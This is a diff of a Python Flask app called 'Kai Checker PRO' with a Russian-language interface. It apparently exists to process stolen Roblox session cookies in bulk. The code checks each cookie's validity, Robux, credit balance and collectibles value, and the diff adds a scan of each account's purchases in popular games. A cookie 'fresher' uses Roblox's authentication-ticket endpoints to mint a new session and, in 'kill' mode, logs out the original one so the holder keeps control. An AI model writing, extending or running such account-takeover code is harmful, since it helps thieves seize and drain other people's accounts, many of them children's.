@@ -9,6 +9,7 @@ import json
 import requests
 from datetime import datetime
 from concurrent.futures import ThreadPoolExecutor, as_completed
+import time
 
 from flask import Flask, render_template_string, request, jsonify, send_file
 from flask_socketio import SocketIO, emit
@@ -17,109 +18,80 @@ app = Flask(__name__)
 app.config['SECRET_KEY'] = 'kai_checker_secret_key_pro'
 socketio = SocketIO(app, cors_allowed_origins="*", async_mode='eventlet')
 
-# Файлы истории
 CHECKER_HISTORY_FILE = "checker_history.json"
 FRESHER_HISTORY_FILE = "fresher_history.json"
 
-# ==================== HTML ТЕМПЛЕЙТ ====================
+# [HTML-код фронтенда остается без изменений...]
 HTML = r"""<!DOCTYPE html>
 <html lang="ru" data-theme="dark">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Kai Checker PRO</title>
-    <script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
-    <link href="https://fonts.googleapis.com/css2?family=Rubik+Puddles&family=Paytone+One&family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
-    <style>
-        :root {
-            --bg: #07030d;
-            --bg-card: rgba(23, 10, 38, 0.55);
-            --border-card: rgba(168, 85, 247, 0.25);
-            --border-hover: rgba(217, 70, 239, 0.6);
-            --input-bg: rgba(12, 5, 20, 0.75);
-            --text-main: #f3e8ff;
-            --text-muted: #a78bfa;
-            --accent-purple: #9333ea;
-            --accent-pink: #c026d3;
-            --accent-glow: rgba(168, 85, 247, 0.2);
-            --gradient-btn: linear-gradient(135deg, #7e22ce 0%, #a855f7 100%);
-            --gradient-btn-hover: linear-gradient(135deg, #9333ea 0%, #c026d3 100%);
-        }
-        [data-theme="light"] {
-            --bg: #f5f0ff;
-            --bg-card: rgba(255, 255, 255, 0.75);
-            --border-card: rgba(168, 85, 247, 0.2);
-            --border-hover: rgba(168, 85, 247, 0.5);
-            --input-bg: rgba(243, 232, 255, 0.6);
-            --text-main: #2e1065;
-            --text-muted: #7e22ce;
-            --accent-purple: #7e22ce;
-            --accent-pink: #c026d3;
-            --accent-glow: rgba(126, 34, 206, 0.15);
-        }
-        * { margin: 0; padding: 0; box-sizing: border-box; outline: none; }
-        body { font-family: 'Plus Jakarta Sans', sans-serif; min-height: 100vh; background: var(--bg); color: var(--text-main); position: relative; overflow-x: hidden; padding: 24px 16px; }
-        #particles-canvas { position: fixed; top: 0; left: 0; width: 100vw; height: 100vh; z-index: 0; pointer-events: none; }
-        .bg-glow { position: fixed; width: 500px; height: 500px; background: radial-gradient(circle, rgba(168, 85, 247, 0.12) 0%, rgba(0,0,0,0) 70%); top: -100px; left: 50%; transform: translateX(-50%); z-index: 0; pointer-events: none; animation: pulseGlow 8s infinite alternate ease-in-out; }
-        @keyframes pulseGlow { 0% { transform: translateX(-50%) scale(1); opacity: 0.5; } 100% { transform: translateX(-50%) scale(1.2); opacity: 0.8; } }
-        .wrapper { max-width: 1350px; margin: 0 auto; position: relative; z-index: 1; background: var(--bg-card); border: 1px solid var(--border-card); backdrop-filter: blur(20px); border-radius: 28px; padding: 32px; box-shadow: 0 20px 60px rgba(0,0,0,0.6), inset 0 1px 0 rgba(255,255,255,0.05); }
-        .header { display: flex; justify-content: space-between; align-items: center; padding-bottom: 24px; border-bottom: 1px solid var(--border-card); margin-bottom: 28px; flex-wrap: wrap; gap: 16px; }
-        .logo-text { font-family: 'Paytone One', cursive; font-size: 38px; font-weight: 900; background: linear-gradient(135deg, #f472b6 0%, #d946ef 40%, #a855f7 100%); -webkit-background-clip: text; -webkit-text-fill-color: transparent; transform: skew(-4deg); }
-        .badge-pro { font-size: 11px; font-weight: 800; background: rgba(168, 85, 247, 0.15); color: var(--accent-pink); padding: 4px 12px; border-radius: 20px; border: 1px solid var(--border-card); letter-spacing: 1.5px; }
-        .stats-bar { display: flex; gap: 12px; flex-wrap: wrap; }
-        .stat-card { background: var(--input-bg); border: 1px solid var(--border-card); padding: 8px 16px; border-radius: 16px; display: flex; flex-direction: column; align-items: center; min-width: 90px; }
-        .stat-val { font-size: 16px; font-weight: 800; color: var(--accent-pink); }
-        .stat-lbl { font-size: 10px; color: var(--text-muted); font-weight: 600; text-transform: uppercase; }
-        .tabs { display: flex; gap: 12px; margin-bottom: 32px; background: var(--input-bg); padding: 8px; border-radius: 22px; border: 1px solid var(--border-card); width: fit-content; flex-wrap: wrap; }
-        .tab { padding: 14px 32px; border-radius: 16px; color: var(--text-muted); cursor: pointer; font-size: 15px; font-weight: 700; transition: all 0.3s; border: 1px solid transparent; background: transparent; }
-        .tab:hover { color: var(--text-main); background: rgba(168, 85, 247, 0.1); border-color: rgba(168, 85, 247, 0.2); }
-        .tab.active { background: var(--gradient-btn); color: #fff; border-color: rgba(255, 255, 255, 0.15); box-shadow: 0 6px 18px var(--accent-glow); }
-        .tab-content { display: none; }
-        .tab-content.active { display: block; }
-        .card { background: var(--bg-card); border: 1px solid var(--border-card); border-radius: 20px; padding: 24px; margin-bottom: 20px; transition: all 0.3s; }
-        .card:hover { border-color: var(--border-hover); box-shadow: 0 10px 25px var(--accent-glow); }
-        .card h2 { font-size: 16px; font-weight: 800; margin-bottom: 16px; display: flex; align-items: center; gap: 8px; }
-        .btn { padding: 12px 24px; border: none; border-radius: 14px; font-size: 13px; font-weight: 700; cursor: pointer; color: #fff; display: inline-flex; align-items: center; justify-content: center; gap: 8px; transition: all 0.25s; box-shadow: 0 4px 12px rgba(0,0,0,0.2); }
-        .btn-primary { background: var(--gradient-btn); }
-        .btn-primary:hover { background: var(--gradient-btn-hover); box-shadow: 0 4px 15px var(--accent-glow); transform: translateY(-1px); }
-        .btn-secondary { background: var(--input-bg); border: 1px solid var(--border-card); color: var(--text-muted); }
-        .btn-secondary:hover { color: var(--text-main); border-color: var(--accent-purple); }
-        .btn-danger { background: rgba(239, 68, 68, 0.15); border: 1px solid rgba(239, 68, 68, 0.3); color: #fca5a5; }
-        .btn-danger:hover { background: rgba(239, 68, 68, 0.3); }
-        .btn-sm { padding: 8px 16px; font-size: 12px; border-radius: 10px; }
-        textarea, input[type="number"], input[type="text"] { width: 100%; padding: 14px; background: var(--input-bg); border: 1px solid var(--border-card); border-radius: 14px; color: var(--text-main); font-family: monospace; font-size: 12px; transition: border-color 0.2s; }
-        textarea:focus, input:focus { border-color: var(--accent-pink); box-shadow: 0 0 8px var(--accent-glow); }
-        .upload-area { min-height: 110px; border: 2px dashed var(--border-card); border-radius: 16px; background: var(--input-bg); display: flex; flex-direction: column; align-items: center; justify-content: center; cursor: pointer; transition: all 0.25s; text-align: center; padding: 16px; }
-        .upload-area:hover, .upload-area.drag-over { border-color: var(--accent-pink); background: rgba(168, 85, 247, 0.05); box-shadow: 0 0 10px var(--accent-glow); }
-        .result-container { margin-top: 16px; }
-        .result-header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 6px; flex-wrap: wrap; gap: 6px; }
-        .result-title { font-size: 12px; font-weight: 700; color: var(--text-muted); }
-        .action-btn-group { display: flex; gap: 6px; align-items: center; flex-wrap: wrap; }
-        .btn-toggle-box, .btn-download-txt, .btn-download-zip { background: rgba(217, 70, 239, 0.15); border: 1px solid rgba(217, 70, 239, 0.3); color: var(--accent-pink); padding: 4px 12px; border-radius: 8px; font-size: 11px; font-weight: 600; cursor: pointer; transition: all 0.2s; }
-        .btn-toggle-box:hover, .btn-download-txt:hover, .btn-download-zip:hover { background: rgba(217, 70, 239, 0.3); box-shadow: 0 0 8px var(--accent-glow); }
-        .result-box { background: var(--input-bg); border: 1px solid var(--border-card); border-radius: 14px; padding: 14px; max-height: 400px; overflow-y: auto; font-family: monospace; font-size: 12px; color: var(--text-main); white-space: pre-wrap; word-break: break-all; margin-top: 6px; }
-        .progress-bar { margin-top: 12px; background: var(--input-bg); border-radius: 20px; height: 8px; overflow: hidden; border: 1px solid var(--border-card); }
-        .progress-fill { height: 100%; width: 0%; background: var(--gradient-btn); transition: width 0.3s ease; }
-        .progress-text { font-size: 12px; color: var(--text-muted); margin-top: 4px; text-align: center; }
-        .checker-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
-        @media(max-width:900px){ .checker-grid { grid-template-columns: 1fr; } }
-        .theme-btn { background: var(--input-bg); border: 1px solid var(--border-card); border-radius: 30px; padding: 8px 16px; cursor: pointer; font-size: 12px; color: var(--text-main); font-weight: 700; transition: all 0.2s; }
-        .theme-btn:hover { border-color: var(--accent-purple); }
-        .footer { text-align: center; padding-top: 20px; color: var(--text-muted); font-size: 12px; font-weight: 600; border-top: 1px solid var(--border-card); margin-top: 24px; }
-        .history-card { background: var(--input-bg); border: 1px solid var(--border-card); border-radius: 16px; padding: 16px; margin-bottom: 14px; }
-        .history-header { display: flex; justify-content: space-between; align-items: center; font-size: 13px; font-weight: 700; color: var(--accent-pink); flex-wrap: wrap; gap: 8px; }
-        .history-users { font-size: 11px; color: var(--text-main); margin-top: 6px; font-weight: 600; display: flex; align-items: center; gap: 8px; flex-wrap: wrap; }
-        .tool-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(320px, 1fr)); gap: 20px; }
-        .fresher-mode-btn.active-mode { background: var(--gradient-btn) !important; color: #fff !important; border-color: var(--accent-pink) !important; box-shadow: 0 0 12px var(--accent-glow); transform: scale(1.02); }
-        .custom-alert-overlay { position: fixed; top: 24px; right: 24px; z-index: 99999; pointer-events: none; }
-        .custom-alert-card { pointer-events: auto; background: rgba(23, 10, 38, 0.95); border: 1px solid var(--border-hover); box-shadow: 0 10px 30px rgba(0,0,0,0.5), 0 0 15px var(--accent-glow); backdrop-filter: blur(12px); border-radius: 16px; padding: 14px 20px; display: flex; align-items: center; gap: 12px; min-width: 280px; max-width: 360px; transform: translateY(-20px) scale(0.95); opacity: 0; transition: all 0.3s; }
-        .custom-alert-overlay.show .custom-alert-card { transform: translateY(0) scale(1); opacity: 1; }
-        .alert-icon { font-size: 22px; line-height: 1; }
-        .alert-body h3 { margin: 0; color: #fff; font-size: 13px; font-weight: 700; }
-        .alert-body p { color: var(--text-muted); font-size: 12px; margin: 0; word-break: break-word; font-weight: 500; }
-        .alert-close-btn { background: transparent; border: none; color: var(--text-muted); font-size: 16px; cursor: pointer; padding: 4px; line-height: 1; }
-        .alert-close-btn:hover { color: #fff; }
-    </style>
+<head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Kai Checker PRO</title><script src="https://cdn.socket.io/4.7.2/socket.io.min.js"></script>
+<link href="https://fonts.googleapis.com/css2?family=Rubik+Puddles&family=Paytone+One&family=Plus+Jakarta+Sans:wght@300;400;500;600;700;800&display=swap" rel="stylesheet">
+<style>
+:root{--bg:#07030d;--bg-card:rgba(23,10,38,0.55);--border-card:rgba(168,85,247,0.25);--border-hover:rgba(217,70,239,0.6);--input-bg:rgba(12,5,20,0.75);--text-main:#f3e8ff;--text-muted:#a78bfa;--accent-purple:#9333ea;--accent-pink:#c026d3;--accent-glow:rgba(168,85,247,0.2);--gradient-btn:linear-gradient(135deg,#7e22ce,#a855f7)}
+[data-theme="light"]{--bg:#f5f0ff;--bg-card:rgba(255,255,255,0.75);--border-card:rgba(168,85,247,0.2);--border-hover:rgba(168,85,247,0.5);--input-bg:rgba(243,232,255,0.6);--text-main:#2e1065;--text-muted:#7e22ce;--accent-purple:#7e22ce;--accent-pink:#c026d3}
+*{margin:0;padding:0;box-sizing:border-box;outline:none}
+body{font-family:'Plus Jakarta Sans',sans-serif;min-height:100vh;background:var(--bg);color:var(--text-main);position:relative;overflow-x:hidden;padding:24px 16px}
+#particles-canvas{position:fixed;top:0;left:0;width:100vw;height:100vh;z-index:0;pointer-events:none}
+.bg-glow{position:fixed;width:500px;height:500px;background:radial-gradient(circle,rgba(168,85,247,0.12) 0%,rgba(0,0,0,0) 70%);top:-100px;left:50%;transform:translateX(-50%);z-index:0;pointer-events:none;animation:pulseGlow 8s infinite alternate ease-in-out}
+@keyframes pulseGlow{0%{transform:translateX(-50%) scale(1);opacity:0.5}100%{transform:translateX(-50%) scale(1.2);opacity:0.8}}
+.wrapper{max-width:1350px;margin:0 auto;position:relative;z-index:1;background:var(--bg-card);border:1px solid var(--border-card);backdrop-filter:blur(20px);border-radius:28px;padding:32px;box-shadow:0 20px 60px rgba(0,0,0,0.6),inset 0 1px 0 rgba(255,255,255,0.05)}
+.header{display:flex;justify-content:space-between;align-items:center;padding-bottom:24px;border-bottom:1px solid var(--border-card);margin-bottom:28px;flex-wrap:wrap;gap:16px}
+.logo-text{font-family:'Paytone One',cursive;font-size:38px;font-weight:900;background:linear-gradient(135deg,#f472b6 0%,#d946ef 40%,#a855f7 100%);-webkit-background-clip:text;-webkit-text-fill-color:transparent;transform:skew(-4deg)}
+.badge-pro{font-size:11px;font-weight:800;background:rgba(168,85,247,0.15);color:var(--accent-pink);padding:4px 12px;border-radius:20px;border:1px solid var(--border-card);letter-spacing:1.5px}
+.stats-bar{display:flex;gap:12px;flex-wrap:wrap}
+.stat-card{background:var(--input-bg);border:1px solid var(--border-card);padding:8px 16px;border-radius:16px;display:flex;flex-direction:column;align-items:center;min-width:90px}
+.stat-val{font-size:16px;font-weight:800;color:var(--accent-pink)}
+.stat-lbl{font-size:10px;color:var(--text-muted);font-weight:600;text-transform:uppercase}
+.tabs{display:flex;gap:12px;margin-bottom:32px;background:var(--input-bg);padding:8px;border-radius:22px;border:1px solid var(--border-card);width:fit-content;flex-wrap:wrap}
+.tab{padding:14px 32px;border-radius:16px;color:var(--text-muted);cursor:pointer;font-size:15px;font-weight:700;transition:all 0.3s;border:1px solid transparent;background:transparent}
+.tab:hover{color:var(--text-main);background:rgba(168,85,247,0.1);border-color:rgba(168,85,247,0.2)}
+.tab.active{background:var(--gradient-btn);color:#fff;border-color:rgba(255,255,255,0.15);box-shadow:0 6px 18px var(--accent-glow)}
+.tab-content{display:none}
+.tab-content.active{display:block}
+.card{background:var(--bg-card);border:1px solid var(--border-card);border-radius:20px;padding:24px;margin-bottom:20px;transition:all 0.3s}
+.card:hover{border-color:var(--border-hover);box-shadow:0 10px 25px var(--accent-glow)}
+.card h2{font-size:16px;font-weight:800;margin-bottom:16px;display:flex;align-items:center;gap:8px}
+.btn{padding:12px 24px;border:none;border-radius:14px;font-size:13px;font-weight:700;cursor:pointer;color:#fff;display:inline-flex;align-items:center;justify-content:center;gap:8px;transition:all 0.25s;box-shadow:0 4px 12px rgba(0,0,0,0.2)}
+.btn-primary{background:var(--gradient-btn)}
+.btn-primary:hover{background:linear-gradient(135deg,#9333ea,#c026d3);box-shadow:0 4px 15px var(--accent-glow);transform:translateY(-1px)}
+.btn-secondary{background:var(--input-bg);border:1px solid var(--border-card);color:var(--text-muted)}
+.btn-secondary:hover{color:var(--text-main);border-color:var(--accent-purple)}
+.btn-danger{background:rgba(239,68,68,0.15);border:1px solid rgba(239,68,68,0.3);color:#fca5a5}
+.btn-danger:hover{background:rgba(239,68,68,0.3)}
+.btn-sm{padding:8px 16px;font-size:12px;border-radius:10px}
+textarea,input[type="number"],input[type="text"]{width:100%;padding:14px;background:var(--input-bg);border:1px solid var(--border-card);border-radius:14px;color:var(--text-main);font-family:monospace;font-size:12px;transition:border-color 0.2s}
+textarea:focus,input:focus{border-color:var(--accent-pink);box-shadow:0 0 8px var(--accent-glow)}
+.upload-area{min-height:110px;border:2px dashed var(--border-card);border-radius:16px;background:var(--input-bg);display:flex;flex-direction:column;align-items:center;justify-content:center;cursor:pointer;transition:all 0.25s;text-align:center;padding:16px}
+.upload-area:hover,.upload-area.drag-over{border-color:var(--accent-pink);background:rgba(168,85,247,0.05);box-shadow:0 0 10px var(--accent-glow)}
+.result-container{margin-top:16px}
+.result-header{display:flex;justify-content:space-between;align-items:center;margin-bottom:6px;flex-wrap:wrap;gap:6px}
+.result-title{font-size:12px;font-weight:700;color:var(--text-muted)}
+.action-btn-group{display:flex;gap:6px;align-items:center;flex-wrap:wrap}
+.btn-toggle-box,.btn-download-txt,.btn-download-zip{background:rgba(217,70,239,0.15);border:1px solid rgba(217,70,239,0.3);color:var(--accent-pink);padding:4px 12px;border-radius:8px;font-size:11px;font-weight:600;cursor:pointer;transition:all 0.2s}
+.btn-toggle-box:hover,.btn-download-txt:hover,.btn-download-zip:hover{background:rgba(217,70,239,0.3);box-shadow:0 0 8px var(--accent-glow)}
+.result-box{background:var(--input-bg);border:1px solid var(--border-card);border-radius:14px;padding:14px;max-height:400px;overflow-y:auto;font-family:monospace;font-size:12px;color:var(--text-main);white-space:pre-wrap;word-break:break-all;margin-top:6px}
+.progress-bar{margin-top:12px;background:var(--input-bg);border-radius:20px;height:8px;overflow:hidden;border:1px solid var(--border-card)}
+.progress-fill{height:100%;width:0%;background:var(--gradient-btn);transition:width 0.3s ease}
+.progress-text{font-size:12px;color:var(--text-muted);margin-top:4px;text-align:center}
+.checker-grid{display:grid;grid-template-columns:1fr 1fr;gap:20px}
+@media(max-width:900px){.checker-grid{grid-template-columns:1fr}}
+.theme-btn{background:var(--input-bg);border:1px solid var(--border-card);border-radius:30px;padding:8px 16px;cursor:pointer;font-size:12px;color:var(--text-main);font-weight:700;transition:all 0.2s}
+.theme-btn:hover{border-color:var(--accent-purple)}
+.footer{text-align:center;padding-top:20px;color:var(--text-muted);font-size:12px;font-weight:600;border-top:1px solid var(--border-card);margin-top:24px}
+.history-card{background:var(--input-bg);border:1px solid var(--border-card);border-radius:16px;padding:16px;margin-bottom:14px}
+.history-header{display:flex;justify-content:space-between;align-items:center;font-size:13px;font-weight:700;color:var(--accent-pink);flex-wrap:wrap;gap:8px}
+.history-users{font-size:11px;color:var(--text-main);margin-top:6px;font-weight:600;display:flex;align-items:center;gap:8px;flex-wrap:wrap}
+.tool-grid{display:grid;grid-template-columns:repeat(auto-fit,minmax(320px,1fr));gap:20px}
+.fresher-mode-btn.active-mode{background:var(--gradient-btn)!important;color:#fff!important;border-color:var(--accent-pink)!important;box-shadow:0 0 12px var(--accent-glow);transform:scale(1.02)}
+.custom-alert-overlay{position:fixed;top:24px;right:24px;z-index:99999;pointer-events:none}
+.custom-alert-card{pointer-events:auto;background:rgba(23,10,38,0.95);border:1px solid var(--border-hover);box-shadow:0 10px 30px rgba(0,0,0,0.5),0 0 15px var(--accent-glow);backdrop-filter:blur(12px);border-radius:16px;padding:14px 20px;display:flex;align-items:center;gap:12px;min-width:280px;max-width:360px;transform:translateY(-20px) scale(0.95);opacity:0;transition:all 0.3s}
+.custom-alert-overlay.show .custom-alert-card{transform:translateY(0) scale(1);opacity:1}
+.alert-icon{font-size:22px;line-height:1}
+.alert-body h3{margin:0;color:#fff;font-size:13px;font-weight:700}
+.alert-body p{color:var(--text-muted);font-size:12px;margin:0;word-break:break-word;font-weight:500}
+.alert-close-btn{background:transparent;border:none;color:var(--text-muted);font-size:16px;cursor:pointer;padding:4px;line-height:1}
+.alert-close-btn:hover{color:#fff}
+</style>
 </head>
 <body>
 <canvas id="particles-canvas"></canvas>
@@ -237,13 +209,11 @@ socket.on('mass_complete', function(data) {
     document.getElementById('massBtn').disabled = false;
     document.getElementById('massBtn').textContent = '🚀 Запустить массовый чек';
     
-    // Перезаписываем massResult и высвечиваем полный итоговый отчет
     document.getElementById('massContainer').style.display = 'block';
     document.getElementById('massResult').style.display = 'block';
     document.getElementById('massResult').textContent = data.message;
     document.getElementById('massResult').scrollTop = 0;
 
-    // Обновляем статистику в шапке
     document.getElementById('statValid').textContent = data.valid_count || 0;
     document.getElementById('statRobux').textContent = (data.total_robux || 0).toLocaleString();
     document.getElementById('statPremium').textContent = data.premium_count || 0;
@@ -530,7 +500,7 @@ async function cleanCookies() {
 </body>
 </html>"""
 
-# ==================== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ИСТОРИИ ====================
+# ==================== ВСПОМОГАТЕЛЬНЫЕ ФУНКЦИИ ====================
 def read_json_file(path):
     if not os.path.exists(path):
         return []
@@ -570,7 +540,7 @@ def save_fresher_history_entry(mode, refreshed_count, usernames, cookies):
     })
     write_json_file(FRESHER_HISTORY_FILE, history)
 
-# ==================== ЛОГИКА ПРОВЕРКИ ROBLOX ====================
+# ==================== ОСНОВНАЯ ЛОГИКА ====================
 def clean_cookie(cookie_str):
     cookie_str = cookie_str.strip()
     if "_|WARNING:-DO-NOT-SHARE-THIS." in cookie_str:
@@ -579,11 +549,55 @@ def clean_cookie(cookie_str):
             return match.group(1)
     return cookie_str
 
+def get_game_purchases(user_id, cookie):
+    headers = {"Cookie": f".ROBLOSECURITY={cookie}", "User-Agent": "Mozilla/5.0"}
+    TARGET_GAMES = [
+        'Adopt Me', 'Blox Fruits', 'Murder Mystery 2', 'Rivals',
+        'Pet Simulator 99', 'Pet Simulator X', 'Arsenal', 'BedWars',
+        'Tower Defense Simulator', 'Anime Adventures'
+    ]
+    purchases_by_game = {}
+    total_spent = 0
+    try:
+        cursor = ""
+        page = 0
+        while page < 5:
+            url = f"https://economy.roblox.com/v2/users/{user_id}/transactions?limit=100&transactionType=Purchase"
+            if cursor:
+                url += f"&cursor={cursor}"
+            r = requests.get(url, headers=headers, timeout=10)
+            if r.status_code != 200:
+                break
+            data = r.json()
+            for item in data.get('data', []):
+                price = abs(item.get('currency', {}).get('amount', 0))
+                if price < 10:
+                    continue
+                game_name = item.get('details', {}).get('place', {}).get('name', 'Другие игры')
+                item_name = item.get('details', {}).get('name', 'Товар')
+                matched = False
+                for target in TARGET_GAMES:
+                    if target.lower() in game_name.lower() or game_name.lower() in target.lower():
+                        matched = True
+                        break
+                if not matched:
+                    continue
+                if game_name not in purchases_by_game:
+                    purchases_by_game[game_name] = []
+                purchases_by_game[game_name].append({'name': item_name, 'price': price})
+                total_spent += price
+            cursor = data.get('nextPageCursor')
+            if not cursor:
+                break
+            page += 1
+            time.sleep(0.1)
+    except:
+        pass
+    return purchases_by_game, total_spent
+
 def get_account_data(cookie):
     cookie = clean_cookie(cookie)
     headers = {"Cookie": f".ROBLOSECURITY={cookie}", "User-Agent": "Mozilla/5.0"}
-    
-    # 1. User Info
     res_user = requests.get("https://users.roblox.com/v1/users/authenticated", headers=headers)
     if res_user.status_code != 200:
         return None
@@ -591,14 +605,10 @@ def get_account_data(cookie):
     user_id = user_data.get("id")
     username = user_data.get("name")
     display_name = user_data.get("displayName")
-    
-    # 2. Robux
     robux = 0
     res_robux = requests.get(f"https://economy.roblox.com/v1/users/{user_id}/currency", headers=headers)
     if res_robux.status_code == 200:
         robux = res_robux.json().get("robux", 0)
-        
-    # 3. Premium & Created
     is_premium = False
     created_date = "N/A"
     res_details = requests.get(f"https://users.roblox.com/v1/users/{user_id}", headers=headers)
@@ -608,44 +618,31 @@ def get_account_data(cookie):
         created_str = dt.get("created", "")
         if created_str:
             created_date = created_str.split("T")[0]
-            
-    # 4. RAP
     rap = 0
     res_rap = requests.get(f"https://inventory.roblox.com/v1/users/{user_id}/assets/collectibles?limit=100", headers=headers)
     if res_rap.status_code == 200:
         data = res_rap.json().get("data", [])
         rap = sum(item.get("recentAveragePrice", 0) for item in data)
-        
-    # 5. Summary Stats (Pending, Credit)
     pending_robux = 0
     res_pend = requests.get(f"https://economy.roblox.com/v2/users/{user_id}/transaction-totals?timeFrame=Month&transactionType=summary", headers=headers)
     if res_pend.status_code == 200:
         pending_robux = res_pend.json().get("pendingRobuxTotal", 0)
-        
     credit = "0.00"
     res_cred = requests.get("https://billing.roblox.com/v1/credit", headers=headers)
     if res_cred.status_code == 200:
         credit = f"{res_cred.json().get('balance', 0):.2f}"
-        
+    game_purchases, game_total_spent = get_game_purchases(user_id, cookie)
     return {
-        "user_id": user_id,
-        "username": username,
-        "display_name": display_name,
-        "robux": robux,
-        "pending_robux": pending_robux,
-        "credit": credit,
-        "is_premium": is_premium,
-        "created_date": created_date,
-        "rap": rap,
-        "cookie": cookie
+        "user_id": user_id, "username": username, "display_name": display_name,
+        "robux": robux, "pending_robux": pending_robux, "credit": credit,
+        "is_premium": is_premium, "created_date": created_date, "rap": rap,
+        "cookie": cookie, "game_purchases": game_purchases, "game_total_spent": game_total_spent
     }
 
 def format_single_report(info):
     if not info:
         return "❌ Невалидный кук или ошибка запроса"
-    
     prem_str = "Да" if info["is_premium"] else "Нет"
-    
     report = f"""========================================
 👤 АККАУНТ: {info['username']} ({info['display_name']})
 ========================================
@@ -657,48 +654,97 @@ def format_single_report(info):
 💳 Баланс / Credit: ${info['credit']}
 💎 RAP (Коллекционка): {info['rap']:,}
 ========================================
+📦 ГЕЙМПАССЫ (популярные игры):
+"""
+    if info['game_purchases']:
+        sorted_games = sorted(info['game_purchases'].items(), key=lambda x: sum(p['price'] for p in x[1]), reverse=True)
+        for game, passes in sorted_games:
+            total = sum(p['price'] for p in passes)
+            report += f"\n  🎮 {game} — {len(passes)} гп, ⏣ {total:,}"
+            for p in passes[:3]:
+                report += f"\n     └─ {p['name']} — ⏣ {p['price']:,}"
+            if len(passes) > 3:
+                report += f"\n     └─ ... и ещё {len(passes) - 3}"
+        report += f"\n\n💰 Всего потрачено на геймпассы: ⏣ {info['game_total_spent']:,}"
+    else:
+        report += "\n  ❌ Геймпассов в популярных играх не найдено"
+    report += f"""
+========================================
 🍪 Кук:
 {info['cookie']}
 ========================================"""
     return report
 
+# ==================== ФРЕШЕР ====================
 def refresh_cookie_action(cookie, mode="duplicate"):
     cookie = clean_cookie(cookie)
-    headers = {"Cookie": f".ROBLOSECURITY={cookie}", "User-Agent": "Mozilla/5.0"}
-    
-    # 1. Получаем CSRF Токен
-    res = requests.post("https://auth.roblox.com/v1/login", headers=headers)
-    csrf_token = res.headers.get("x-csrf-token")
-    if not csrf_token:
-        return None
-    
-    headers["X-CSRF-TOKEN"] = csrf_token
-    
-    # 2. Вызываем перевыпуск
-    res_refresh = requests.post("https://auth.roblox.com/v1/authentication-ticket", headers=headers)
-    ticket = res_refresh.headers.get("rbx-authentication-ticket")
-    if not ticket:
-        return None
-        
-    res_new = requests.post("https://auth.roblox.com/v1/authentication-ticket/redeem", 
-                            json={"authenticationTicket": ticket}, 
-                            headers={"User-Agent": "Mozilla/5.0"})
-    
-    new_cookie = None
-    for c in res_new.cookies:
-        if c.name == ".ROBLOSECURITY":
-            new_cookie = c.value
-            break
-            
-    if not new_cookie:
-        return None
-        
-    if mode == "kill":
-        requests.post("https://auth.roblox.com/v1/logout", headers=headers)
-        
-    return new_cookie
+    result = {'success': False, 'new_cookie': None, 'username': '?', 'user_id': '?', 'error': None}
+    try:
+        c = cookie.strip()
+        if ".ROBLOSECURITY=" in c:
+            c = c.split(".ROBLOSECURITY=")[1].split(";")[0]
+        cookies_dict = {'.ROBLOSECURITY': c}
+        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36', 'Accept': 'application/json, text/plain, */*'}
+        check_r = requests.get('https://users.roblox.com/v1/users/authenticated', cookies=cookies_dict, headers=headers, timeout=10)
+        if check_r.status_code != 200:
+            result['error'] = "Кука невалидна"
+            return result
+        user_data = check_r.json()
+        result['username'] = user_data.get('name', '?')
+        result['user_id'] = user_data.get('id', '?')
+        csrf_r = requests.post('https://auth.roblox.com/v2/logout', cookies=cookies_dict, headers={'User-Agent': 'Mozilla/5.0', 'Content-Type': 'application/json'}, timeout=10)
+        csrf_token = csrf_r.headers.get('x-csrf-token')
+        if not csrf_token:
+            result['error'] = "CSRF token not found"
+            return result
+        ticket_headers = {'User-Agent': 'Mozilla/5.0', 'RBXauthenticationNegotiation': '1', 'Referer': 'https://www.roblox.com/', 'X-CSRF-Token': csrf_token, 'Content-Type': 'application/json'}
+        ticket_r = requests.post('https://auth.roblox.com/v1/authentication-ticket', headers=ticket_headers, cookies=cookies_dict, json={}, timeout=15)
+        auth_ticket = ticket_r.headers.get('rbx-authentication-ticket')
+        if not auth_ticket:
+            result['error'] = "Auth ticket not found"
+            return result
+        redeem_headers = {'User-Agent': 'Mozilla/5.0', 'RBXauthenticationNegotiation': '1', 'Content-Type': 'application/json'}
+        redeem_r = requests.post('https://auth.roblox.com/v1/authentication-ticket/redeem', headers=redeem_headers, json={"authenticationTicket": auth_ticket}, timeout=15)
+        new_cookie = None
+        set_cookie = redeem_r.headers.get('Set-Cookie', '')
+        if '.ROBLOSECURITY=' in set_cookie:
+            match = re.search(r'\.ROBLOSECURITY=([^;]+)', set_cookie)
+            if match:
+                new_cookie = match.group(1)
+        if not new_cookie:
+            for co in redeem_r.cookies:
+                if co.name == '.ROBLOSECURITY' and co.value:
+                    new_cookie = co.value
+                    break
+        if not new_cookie:
+            result['error'] = "New cookie not found"
+            return result
+        if mode == "kill":
+            try:
+                kill_headers = {'User-Agent': 'Mozilla/5.0', 'X-CSRF-Token': csrf_token, 'Content-Type': 'application/json'}
+                requests.post('https://auth.roblox.com/v2/logout', headers=kill_headers, cookies=cookies_dict, timeout=10)
+            except:
+                pass
+        test_s = requests.Session()
+        test_s.headers.update({'User-Agent': 'Mozilla/5.0', 'Accept': 'application/json'})
+        test_r = test_s.get('https://users.roblox.com/v1/users/authenticated', cookies={'.ROBLOSECURITY': new_cookie}, timeout=10)
+        if test_r.status_code == 200 and 'id' in test_r.json():
+            result['new_cookie'] = new_cookie
+            result['success'] = True
+            result['username'] = test_r.json().get('name', result['username'])
+        else:
+            result['error'] = "New cookie validation failed"
+    except Exception as e:
+        result['error'] = str(e)
+    return result
 
-# ==================== ЭНДПОИНТЫ API ====================
+def refresh_cookie_simple(cookie, mode="duplicate"):
+    result = refresh_cookie_action(cookie, mode)
+    if result['success']:
+        return result['new_cookie']
+    return None
+
+# ==================== API ЭНДПОИНТЫ ====================
 @app.route('/')
 def index():
     return render_template_string(HTML)
@@ -719,30 +765,27 @@ def mass_check_ws():
